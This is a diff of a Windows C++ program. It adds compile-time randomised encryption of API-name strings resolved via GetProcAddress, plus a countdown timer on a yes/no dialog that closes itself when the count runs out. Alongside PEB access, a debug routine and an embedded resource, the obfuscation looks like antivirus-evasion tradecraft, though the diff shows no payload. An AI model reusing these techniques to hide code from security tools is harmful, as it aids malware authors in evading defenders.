@@ -4,6 +4,7 @@
 #include <time.h>
 #include <windows.h>
 #include <array>
+#include <limits>
 
 #include "swap.h"
 #include "defs.h"
@@ -87,13 +88,40 @@ __fdecl void __(const char *s,unsigned short l){
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
 namespace obfs {
-	template <typename Indexes, int n> class MetaString;
-	template <size_t... I, int n> class MetaString<std::index_sequence<I...>,n> {
+  constexpr int RandomSeed(void){
+    return '0'    * -40271 + // offset accounting for digits ANSI offsets
+      __TIME__[7] *      1 +
+      __TIME__[6] *     10 +
+      __TIME__[4] *     60 +
+      __TIME__[3] *    600 +
+      __TIME__[1] *   3600 +
+      __TIME__[0] *  36000;
+  };
+  template <unsigned int a,
+            unsigned int c,
+            unsigned int seed,
+            unsigned int Limit>
+  struct LinearCongruentialEngine{
+    enum { value=(a*LinearCongruentialEngine<a,c-1,seed,Limit>::value+1)%Limit };
+  };
+  template <unsigned int a,
+            unsigned int seed,
+            unsigned int Limit>
+  struct LinearCongruentialEngine<a,0,seed,Limit>{
+    enum {value=(a*seed+1)%Limit };
+  };
+  template <int N,int Limit>
+  struct MetaRandom {
+    enum { value=LinearCongruentialEngine<22695477,N,RandomSeed(),Limit>::value };
+  };
+
+	template <typename Indexes, int n,int id> class MetaString;
+	template <size_t... I, int n,int id> class MetaString<std::index_sequence<I...>,n,id> {
     public:
       constexpr MetaString(char const *str)
         : encrypted_buffer{ encrypt(str[I])... } {};
     public:
-      constexpr char* decrypt(void){
+      char* decrypt(void){
         for (size_t i=0;i<sizeof...(I);i++){
           buffer[i]=decrypt(encrypted_buffer[i]);
         };
@@ -101,15 +129,15 @@ namespace obfs {
         return buffer;
       }
     private:
-      constexpr char encrypt(char c) const { return (c+0xa)^F_0; } ;
-      constexpr char decrypt(char c) const { return (c^F_0)-0xa; } ;
+      constexpr char encrypt(char c) const { return (c+0xa)^ffs[n]()^ffs[(uint8_t)F_0](); } ;
+      char decrypt(char c) const { return (c^ffs[n]()^ffs[(uint8_t)F_0]())-0xa; } ;
     private:
       char buffer[sizeof...(I) + 1] {};
       char encrypted_buffer[sizeof...(I)] {};
 	};
 };
 
-#define o(str,n) (obfs::MetaString<std::make_index_sequence<sizeof(str)>,n>(str).decrypt())
+#define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>,obfs::MetaRandom<__COUNTER__,256>::value,__COUNTER__>(str).decrypt())
 
 static void *ppeb=NULL;
 __fdecl void dbg();
@@ -299,6 +327,8 @@ static TRACKMOUSEEVENT tme;
 static int dlg_ret=0;
 static bool inv=false;
 static uint8_t *image=NULL;
+static uint32_t tcounter=60;
+static char tnumbers[100][3];
 
 static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   switch(msg){
@@ -414,7 +444,17 @@ static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lPar
       };
       ((EPA)_f(epa))(hWnd,&ps);
       break;
+    case WM_TIMER:
+      if(tcounter){
+        SetWindowTextA(hWnd,tnumbers[--tcounter]);
+      }
+      else{
+        DestroyWindow(hWnd);
+        return 0;
+      };
+      break;
     case WM_DESTROY:
+      KillTimer(hWnd,0);
       PostQuitMessage(0);
       ((DDC)_f(ddc))(hdcMem);
       ((DOB)_f(dob))(hBitmap);
@@ -442,7 +482,7 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   rc={0,0,506,191};
   rc_yes={19,104,234,175};
   rc_no={272,104,487,175};
-  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
+  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU,FALSE);
   int nWidth=rc.right-rc.left;
   int nHeight=rc.bottom-rc.top;
   int nX=(((GSM)_f(gsm))(SM_CXSCREEN)-nWidth)/2;
@@ -459,6 +499,8 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   };
   tme.hwndTrack=hWnd;
   ShowWindow(hWnd,SW_SHOW);
+  SetTimer(hWnd,0,1000,(TIMERPROC)NULL);
+  SetWindowTextA(hWnd,tnumbers[tcounter]);
   ((UWI)_f(uwi))(hWnd);
   MSG msg;
   while(GetMessageA(&msg,NULL,0,0)){
@@ -798,19 +840,31 @@ __fdecl void dbg(){
   return;
 };
 
+__fdecl void init_tnumbers(){
+  uint16_t i;
+  char *t=(char *)tnumbers;
+  for(i=0;i<300;i+=3){
+    t[i]=(char)(i/30+48);
+    t[i+1]=(char)((i/3)%10+48);
+    t[i+2]=0;
+  };
+};
+
 __fdecl void init(){
   get_ppeb();
   get_handles();
-  sle=(SLE)gpa(hkernel32,o("SetLastError",0));
+  init_tnumbers();
+  sle=(SLE)gpa(hkernel32,o("SetLastError"));
   if(sle) sle(0);
+  else ExitProcess(1);
   iMutex=CreateMutexA(NULL,true,imutex);
   if(iMutex){
     if(GetLastError()==ERROR_ALREADY_EXISTS) ExitProcess(0);
   }
   else ExitProcess(0);
-  fra=(FRA)gpa(hkernel32,o("FindResourceA",1));
-  lrs=(LRS)gpa(hkernel32,o("LoadResource",2));
-  lcr=(LCR)gpa(hkernel32,o("LockResource",3));
+  fra=(FRA)gpa(hkernel32,o("FindResourceA"));
+  lrs=(LRS)gpa(hkernel32,o("LoadResource"));
+  lcr=(LCR)gpa(hkernel32,o("LockResource"));
   if(fra && lrs && lcr) res=(uint8_t *)(load_res(data_res)+54);
   if(res==NULL){
     if(iMutex) CloseHandle(iMutex);
